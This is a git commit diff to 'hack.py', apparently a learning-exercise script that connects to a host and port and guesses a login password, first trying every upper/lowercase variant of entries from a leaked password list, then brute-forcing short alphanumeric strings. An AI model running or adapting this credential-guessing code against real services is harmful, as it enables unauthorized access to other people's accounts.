4c58bf65e4dc37461edf143f7d45170d7705ae19
Pawel <pjuszcze@gmail.com>
2021-02-23 18:22:23 +0100

    Added: checks passwords from popular password list and modify each one  with lower and upper letters

--- hack.py
+++ hack.py
@@ -6,7 +6,6 @@ import string
 """
 Args: Host, port
 Password list: https://www.troyhunt.com/the-773-million-record-collection-1-data-reach/
-
 """
 
 socket_1 = socket.socket()
@@ -18,8 +17,27 @@ nums = list(string.digits)
 all_char = list(itertools.chain(nums, alphabet))
 
 socket_1.connect(address)
+with open("passwords.txt", 'r') as f:
+    pass_list = f.read().splitlines()
+
+
 while True:
-    for _ in range(1, 4):
+    # password list first
+    for _ in pass_list:
+        up_lo = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in _)))
+        for a in up_lo:
+            socket_1.send(a.encode())
+            response = socket_1.recv(1024)
+            if response.decode() == "Connection success!":
+                print("Pass word was hacked:", _)
+                break
+        if response.decode() == "Connection success!":
+            break
+    if response.decode() == "Connection success!":
+            break
+    
+    # generator 
+    for _ in range(1, 5):
         prods = itertools.product(all_char, repeat=_)
 
         while True:
